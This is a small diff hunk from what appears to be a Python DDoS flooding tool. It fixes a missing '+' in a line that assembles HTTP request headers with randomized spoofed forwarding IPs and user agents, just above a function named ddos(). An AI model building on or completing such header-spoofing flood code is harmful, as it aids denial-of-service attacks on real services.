@@ -2432,7 +2432,7 @@ def Headers(method):
             0, 255)) + "." + str(random.randint(0, 255)) + "." + str(
                 random.randint(0, 255)) + "\r\n"
         useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
-        request = post_host + post_again get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
+        request = post_host + post_again + get_host + socks + forward + connection + mozila + forwards + header + useragent + accept + length + randomip + referer + content + "\r\n"
     return header
 
 def ddos():
